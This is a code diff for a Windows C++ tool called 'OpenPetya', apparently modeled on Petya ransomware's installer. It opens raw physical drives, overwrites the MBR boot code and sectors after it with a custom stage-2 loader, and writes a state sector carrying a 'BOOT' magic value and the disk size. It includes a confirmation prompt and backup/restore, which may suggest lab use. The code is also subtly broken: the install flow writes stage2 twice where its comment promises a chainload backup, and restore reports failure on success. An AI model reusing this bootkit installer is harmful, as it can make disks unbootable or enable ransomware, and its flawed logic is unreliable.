@@ -14,10 +14,10 @@
 #pragma comment(lib, "setupapi.dll")
 
 #define SECTOR_SIZE 512
-#define MBR_BOOT_CODE_SIZE 446;
+#define MBR_BOOT_CODE_SIZE 446
 #define MBR_FULL_SIZE 512
 #define STAGE2_START_SECTOR 1
-#define BACKUP_MBR_SECTOR 63;
+#define BACKUP_MBR_SECTOR 63
 
 struct stDriveInfo
 {
@@ -86,7 +86,7 @@ public:
         DWORD dwAccess = bWriteAccess ? GENERIC_READ | GENERIC_WRITE : GENERIC_READ;
         m_hFile = CreateFileW(
             szPath.c_str(),
-            bWriteAccess,
+            dwAccess,
             FILE_SHARE_READ | FILE_SHARE_WRITE,
             nullptr,
             OPEN_EXISTING,
@@ -132,7 +132,24 @@ public:
 
     bool fnbWriteSectors(LONGLONG nLBA, const std::vector<uint8_t>& abBuffer)
     {
+        LARGE_INTEGER nOffset;
+        nOffset.QuadPart = nLBA * SECTOR_SIZE;
 
+        if (!SetFilePointerEx(m_hFile, nOffset, nullptr, FILE_BEGIN))
+        {
+            std::wcerr << "Seek failed (error " << GetLastError() << ")\n";
+            return false;
+        }
+
+        DWORD written = 0;
+        if (!WriteFile(m_hFile, abBuffer.data(), (DWORD)abBuffer.size(), &written, nullptr) || written != abBuffer.size())
+        {
+            std::wcerr << "Write failed (error " << GetLastError() << ")\n";
+            return false;
+        }
+
+        FlushFileBuffers(m_hFile);
+        return true;
     }
 };
 
@@ -142,7 +159,7 @@ std::vector<stDriveInfo> fnListDrives()
 
     for (int i = 0; i < 16; i++)
     {
-        std::wstring szPath = TEXT("\\\\.\\PhysicalDrive") + std::to_wstring(i);
+        std::wstring szPath = L"\\\\.\\PhysicalDrive" + std::to_wstring(i);
         HANDLE hFile = CreateFileW(
             szPath.c_str(),
             0, // query only, no read/write
@@ -183,7 +200,7 @@ std::vector<stDriveInfo> fnListDrives()
                 if (nLength > 0)
                 {
                     std::wstring s(nLength, 0);
-                    MultiByteToWideChar(CP_ACP, 0, szModel, -1, s.data(), nLength);
+                    MultiByteToWideChar(CP_ACP, 0, szModel, -1, &s[0], nLength);
                     while (!s.empty() && (s.back() == L' ' || s.back() == L'\0'))
                         s.pop_back();
 
@@ -241,27 +258,340 @@ bool fnbReadFile(const std::string& szPath, std::vector<uint8_t>& abBuffer)
 
 void fnPadToSector(std::vector<uint8_t>& abBuffer)
 {
-
+    size_t rem = abBuffer.size() % SECTOR_SIZE;
+    if (rem != 0)
+        abBuffer.resize(abBuffer.size() + SECTOR_SIZE - rem, 0);
 }
 
 bool fnbValidateMBR(const std::vector<uint8_t>& abMBR)
 {
+    if (abMBR.size() < SECTOR_SIZE)
+        return false;
 
+    return abMBR[510] == 0x55 && abMBR[511] == 0xAA;
 }
 
+bool fnbBackupMBR(const std::wstring& szDrivePath, const std::string& szOutPath)
+{
+    std::wcout << L"\n[Backup MBR] Reading sector 0...\n";
+    
+    clsDiskHandle disk;
+    if (!disk.fnbOpen(szDrivePath, false))
+        return false;
 
+    std::vector<uint8_t> abMBR;
+    if (!disk.fnbReadSectors(0, 1, abMBR))
+        return false;
 
-void fnPrintUsage(const TCHAR* szProg)
+    std::cout   << "Boot signature: "
+                << std::hex << (int)abMBR[510] << " " << (int)abMBR[511]
+                << std::dec << "\n";
+
+    std::cout   << "Partition table (0x1BE):\n";
+    for (int i = 0; i < 4; i++)
+    {
+        uint8_t* e = abMBR.data() + 0x1BE + i * 16;
+        uint8_t type = e[4];
+        uint32_t lba = *(uint32_t *)(e + 8);
+        uint32_t sector = *(uint32_t *)(e + 12);
+
+        if (type == 0)
+            continue;
+
+        std::cout << "\t[" << i << "] type=0x" << std::hex << (int)type << " lba=" << std::dec << lba << " sectors=" << sector;
+
+        if (type == 0x07)
+            std::cout << " (NTFS)";
+        if (type == 0x0B || type == 0x0C)
+            std::cout << " (FAT32)";
+        if (type == 0x05 || type == 0x0F)
+            std::cout << " (Extended)";
+        if (type == 0x83)
+            std::cout << " (Linux)";
+
+        std::cout << "\n";
+    }
+
+    // Write to file
+    std::ofstream fs(szOutPath, std::ios::binary);
+    if (!fs)
+    {
+        std::cerr << "Cannot create backup file: " << szOutPath << "\n";
+        return false;
+    }
+
+    fs.write(reinterpret_cast<char*>(abMBR.data()), abMBR.size());
+    std::cout << "Saved to: " << szOutPath << "\n";
+
+    return true;
+}
+
+bool fnbSaveChainloadBackup(const std::wstring& szDrivePath)
+{
+    std::cout << "\n[Chainload backup] Saving original MBR to sector " << BACKUP_MBR_SECTOR << "...\n";
+
+    clsDiskHandle disk;
+    if (!disk.fnbOpen(szDrivePath, true))
+        return false;
+
+    // Read sector 0
+    std::vector<uint8_t> abMBR;
+    if (!disk.fnbReadSectors(0, 1, abMBR))
+        return false;
+
+    if (!fnbValidateMBR(abMBR))
+    {
+        std::cerr << "Warning: no 0x55AA signature in sector 0\n";
+    }
+
+    // Write original MBR to sector 63
+    if (!disk.fnbWriteSectors(BACKUP_MBR_SECTOR, abMBR))
+        return false;
+
+    std::cout << "Original MBR is successfully saved to sector " << BACKUP_MBR_SECTOR << "\n";
+    
+    return true;
+}
+
+bool fnbWriteMBR(const std::wstring& szDrivePath, const std::string& szMbrPath)
+{
+    std::cout << "\n[Write MBR] Installing custom boot code...\n";
+
+    // Read custom MBR binary file
+    std::vector<uint8_t> abMBR;
+    if (!fnbReadFile(szMbrPath, abMBR))
+        return false;
+
+    if (!fnbValidateMBR(abMBR))
+    {
+        std::cerr << "Error: " << szMbrPath << " has no 0x55 signature!\n";
+        return false;
+    }
+
+    printf("Custom MBR: %s (%d)\n", szMbrPath, abMBR.size());
+
+    clsDiskHandle disk;
+    if (!disk.fnbOpen(szDrivePath, true))
+        return false;
+
+    // Read current MBR from disk because we need the partition table
+    std::vector<uint8_t> abDiskMBR;
+    if (!disk.fnbReadSectors(0, 1, abDiskMBR))
+        return false;
+
+    // Merge the custom boot code (446 bytes) + disk's partition table (64 bytes) + 0x55AA
+    std::vector<uint8_t> abMerged(SECTOR_SIZE);
+
+    // Copy the boot code (byte 0 to 445)
+    memcpy(abMerged.data(), abMBR.data(), MBR_BOOT_CODE_SIZE);
+
+    // Keep original partition table (bytes 446-509)
+    memcpy(abMerged.data() + 0x1BE, abDiskMBR.data() + 0x1BE, 64);
+
+    // Boot signature (byte 510-511)
+    abMerged[510] = 0x55;
+    abMerged[511] = 0xAA;
+
+    // Overwrite
+    if (!disk.fnbWriteSectors(0, abMerged))
+        return false;
+
+    std::cout << "Boot code is written (446 bytes), partition table is preserved.\n";
+    std::cout << "Boot signature: 0x55 0xAA\n";
+
+    return true;
+}
+
+bool fnbWriteStage2(const std::wstring& szDrivePath, const std::string& szStage2Path)
+{
+    std::cout << "\n[Write Stage2] Installing Stage2 bootloader...\n";
+
+    std::vector<uint8_t> abStage2;
+    if (!fnbReadFile(szStage2Path, abStage2))
+        return false;
+
+    fnPadToSector(abStage2);
+
+    DWORD sectors = (DWORD)(abStage2.size() / SECTOR_SIZE);
+    
+    printf("Stage2: %s (%d bytes, sectors %d)\n", szStage2Path, abStage2.size(), sectors);
+    printf("Writing to sectors %d-%d...\n", STAGE2_START_SECTOR, STAGE2_START_SECTOR + sectors + 1);
+
+    clsDiskHandle disk;
+    if (!disk.fnbOpen(szDrivePath, true))
+        return false;
+
+    if (!disk.fnbWriteSectors(STAGE2_START_SECTOR, abStage2))
+        return false;
+
+    std::cout << "Stage2 is successfulyl written.\n";
+
+    return true;
+}
+
+bool fnbRestoreMBR(const std::wstring& szDrivePath, const std::string& szBackupFile)
+{
+    std::cout << "\n[Restore MBR] Restoring original MBR...\n";
+    std::vector<uint8_t> abBackup;
+
+    if (!fnbReadFile(szBackupFile, abBackup))
+    {
+        std::cerr << "\nRead backup file failed!\n";
+        return false;
+    }
+
+    if (abBackup.size() < SECTOR_SIZE)
+    {
+        std::cerr << "\tBackup file too small!\n";
+        return false;
+    }
+
+    if (!fnbValidateMBR(abBackup))
+    {
+        std::cerr << "\tWarning: backup has no 0x55AA signature.\n";
+    }
+
+    fnPadToSector(abBackup);
+    abBackup.resize(SECTOR_SIZE);
+
+    clsDiskHandle disk;
+    if (!disk.fnbOpen(szDrivePath, true))
+        return false;
+
+    if (!disk.fnbWriteSectors(0, abBackup))
+        return false;
+
+    std::cout << "\tOriginal MBR is restored successfully.\n";
+
+    return false;
+}
+
+bool fnbValidate(const std::wstring& szDrivePath)
+{
+    std::cout << "\n[Validate] Reading disk...\n";
+
+    clsDiskHandle disk;
+    if (!disk.fnbOpen(szDrivePath, false))
+        return false;
+
+    std::vector<uint8_t> abMBR;
+    if (!disk.fnbReadSectors(0, 1, abMBR))
+        return false;
+
+    std::cout << "\n\tMBR (sector 0) first 64 bytes:\n";
+    fnHexdump(abMBR.data(), 64, 0);
+
+    std::cout << "\n\tBoot sigature: 0x" << std::hex << (int)abMBR[510] << " 0x" << (int)abMBR[511] << std::dec;
+    if (abMBR[510] == 0x55 && abMBR[511] == 0xAA)
+        std::cout << " (valid)\n";
+    else
+        std::cout << " (INVALID)\n";
+
+    std::cout << "\n\tPartition table:\n";
+    for (int i = 0; i < 4; i++)
+    {
+        uint8_t *e = abMBR.data() + 0x1BE + i * 16;
+        uint8_t type = e[4];
+        uint32_t lba = *(uint32_t *)(e + 8);
+        uint32_t sector = *(uint32_t *)(e + 12);
+
+        if (type == 0)
+            continue;
+
+        std::cout   << "\t[" << i << "] type=0x" << std::hex << (int)type << " lba=" << std::dec << lba << " sectors=" << sector;
+
+        if (type == 0x07)
+            std::cout << " (NTFS)";
+        if (type == 0x08 || type == 0x0C)
+            std::cout << " (FAT32)";
+
+        std::cout << "\n";
+    }
+
+    // Check sector 63 (chainload backup)
+    std::vector<uint8_t> abBackup;
+    if (disk.fnbReadSectors(BACKUP_MBR_SECTOR, 1, abBackup))
+        std::cout << "\n\tSector " << BACKUP_MBR_SECTOR << " (chainload backup) signature: 0x" << std::hex << (int)abBackup[510] << "0x" << (int)abBackup[511] << std::dec << "\n";
+
+    return true;
+}
+
+bool fnbConfirm(const std::string& szMsg)
+{
+    std::cout << "\n " << szMsg << " (yes/no): ";
+    std::string szAns;
+    std::getline(std::cin, szAns);
+
+    return szAns == "yes" || szAns == "YES" || szAns == "y";
+}
+
+bool fnbWriteDiskSize(const std::wstring& szDrivePath, UINT64 nTotalSectors)
+{
+    std::cout << "\n[Write disk size] Sectors: " << nTotalSectors << "\n";
+
+    clsDiskHandle disk;
+    if (!disk.fnbOpen(szDrivePath, true))
+        return false;
+
+    std::vector<uint8_t> abStateSector(SECTOR_SIZE, 0);
+
+    uint32_t magic = 0x424F4F54UL;
+    memcpy(abStateSector.data(), &magic, 4);
+    abStateSector[4] = 0x00;
+    memcpy(abStateSector.data() + 8, &nTotalSectors, 8);
+
+    if (!disk.fnbWriteSectors(60, abStateSector))
+        return false;
+
+    std::cout << "\tDisk size is written to state sector.\n";
+
+    return true;
+}
+
+UINT64 fnGetDiskTotalSectors(const std::wstring& szDrivePath)
+{
+    HANDLE hFile = CreateFileW(
+        szDrivePath.c_str(),
+        GENERIC_READ,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        nullptr,
+        OPEN_EXISTING,
+        0,
+        nullptr
+    );
+
+    if (INVALID_HANDLE_VALUE == hFile)
+        return 0;
+
+    DISK_GEOMETRY_EX geo = {};
+    DWORD ret = 0;
+    DeviceIoControl(hFile, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, nullptr, 0, &geo, sizeof(geo), &ret, nullptr);
+    CloseHandle(hFile);
+
+    return (UINT64)geo.DiskSize.QuadPart / 512;
+}
+
+void fnPrintUsage(const char* szProg)
 {
     std::wcout  << "\nUsage: " << szProg << " [options]\n\n"
                 << "Options:\n"
                 << "\t--list\n"
                 << "\t--backup-mbr <file>\n"
-
-                << "\n";
+                << "\t--save-chainload\n"
+                << "\t--write-mbr\n"
+                << "\t--write-stage2\n"
+                << "\t--restore-mbr\n"
+                << "\t--validate\n"
+                << "\t--install\n"
+                << "\nExamples:\n"
+                << "\tOpenPetya.exe --list\n"
+                << "\tOpenPetya.exe --drive 1 --backup-mbr\n"
+                << "\tOpenPetya.exe --drive 1 --install mbr.bin stage2.bin\n"
+                << "\tOpenPetya.exe --drive 1 --restore-mbr original_mbr.bin\n"
+                << "\tOpenPetya.exe --drive 1 --validate\n\n";
 }
 
-int _tmain(int argc, TCHAR *argv[])
+int _tmain(int argc, char *argv[])
 {
     if (argc < 2)
     {
@@ -269,5 +599,169 @@ int _tmain(int argc, TCHAR *argv[])
         return 1;
     }
 
-    return 0;
+    int nIdxDrive = -1;
+    bool bList = false;
+    bool bBackup = false;
+    bool bChainload = false;
+    bool bWriteMBR = false;
+    bool bWriteStage2 = false;
+    bool bRestore = false;
+    bool bValidate = false;
+    bool bInstall = false;
+
+    std::string szBackupPath;
+    std::string szMbrPath;
+    std::string szStage2Path;
+    std::string szRestorePath;
+
+    for (int i = 1; i < argc; i++)
+    {
+        std::string arg = argv[i];
+
+        if (arg == "--list")
+        {
+            bList = true;
+        }
+        else if (arg == "--drive" && i + 1 < argc)
+        {
+            nIdxDrive = std::stoi(argv[++i]);
+        }
+        else if (arg == "--backup-mbr" && i + 1 < argc)
+        {
+            bBackup = true;
+            szBackupPath = argv[++i];
+        }
+        else if (arg == "--save-chainload")
+        {
+            bChainload = true;
+        }
+        else if (arg == "--write-mbr" && i + 1 < argc)
+        {
+            bWriteMBR = true;
+            szMbrPath = argv[++i];
+        }
+        else if (arg == "--write-stage2" && i + 1 < argc)
+        {
+            bWriteStage2 = true;
+            szStage2Path = argv[++i];
+        }
+        else if (arg == "--restore-mbr" && i + 1 < argc)
+        {
+            bRestore = true;
+            szRestorePath = argv[++i];
+        }
+        else if (arg == "--validate" && i + 1 < argc)
+        {
+            bValidate = true;
+        }
+        else if (arg == "--install" && i + 2 < argc)
+        {
+            bInstall = true;
+            szMbrPath = argv[++i];
+            szStage2Path = argv[++i];
+        }
+        else
+        {
+            std::cerr << "Unknown option: " << arg << L"\n";
+            fnPrintUsage(argv[0]);
+
+            return 1;
+        }
+    }
+
+    // List drives (no specified drive need)
+    if (bList)
+    {
+        auto drives = fnListDrives();
+        if (drives.empty())
+        {
+            std::wcout << L" No drives found (need Administrator?)\n";
+            return 1;
+        }
+
+        fnPrintDrives(drives);
+
+        return 0;
+    }
+
+    // All other operations need --drive
+    if (nIdxDrive < 0)
+    {
+        std::wcerr << "Error: --drive N is required\n";
+        fnPrintUsage(argv[0]);
+
+        return 1;
+    }
+
+    std::wstring szDrivePath = L"\\\\.\\PhysicalDrive" + std::to_wstring(nIdxDrive);
+    std::wcout << L"\nTarget drive: " << szDrivePath << L"\n";
+
+    // --install: full workflow
+    bool bRet = true;
+    if (bInstall)
+    {
+        UINT64 nTotalSectors = fnGetDiskTotalSectors(szDrivePath);
+
+        std::cout << "\nFull Install\n";
+        std::cout << "\tMBR file: " << szMbrPath << "\n";
+        std::cout << "\tStage file: " << szStage2Path << "\n";
+
+        if (!fnbConfirm("This will modify the MBR of PhysicalDrive" + std::to_string(nIdxDrive) + ". Partition table will be preserved. Continue?"))
+        {
+            std::cout << "\tCancelled.\n";
+
+            return 0;
+        }
+
+        // Backup MBR to file
+        szBackupPath = "original_mbr_" + std::to_string(nIdxDrive) + ".bin";
+        bRet = bRet && fnbBackupMBR(szDrivePath, szBackupPath);
+
+        // Save original MBR to sector 63 for chainloading
+        bRet = bRet && fnbWriteStage2(szDrivePath, szStage2Path);
+
+        // Write custom MBR boot code
+        bRet = bRet && fnbWriteMBR(szDrivePath, szMbrPath);
+
+        // Write stage2
+        bRet = bRet && fnbWriteStage2(szDrivePath, szStage2Path);
+
+        // Write sector 60
+        bRet = bRet && fnbWriteDiskSize(szDrivePath, nTotalSectors);
+
+        // Validate
+        if (bRet)
+            fnbValidate(szDrivePath);
+
+        std::cout << "Installation is " << (bRet ? "completed!" : "FAILED!") << "\n";
+
+        if (bRet)
+        {
+            std::cout << "\nBackup is saved to: " << szBackupPath << "\n";
+            std::cout << "To restore: OpenPetya.exe --drive " << nIdxDrive << " --restore-mbr " << szBackupPath << "\n";
+        }
+
+        return (int)bRet;
+    }
+
+    // Individual operations
+    if (bBackup)
+        bRet = bRet && fnbBackupMBR(szDrivePath, szBackupPath);
+
+    if (bChainload)
+        bRet = bRet && fnbSaveChainloadBackup(szDrivePath);
+
+    if (bWriteMBR)
+        bRet = bRet && fnbWriteMBR(szDrivePath, szMbrPath);
+
+    if (bWriteStage2)
+        bRet = bRet && fnbWriteStage2(szDrivePath, szStage2Path);
+
+    if (bRestore)
+        bRet = bRet && fnbRestoreMBR(szDrivePath, szRestorePath);
+
+    if (bValidate)
+        bRet = bRet && fnbValidate(szDrivePath);
+
+    return (int)bRet;
 }
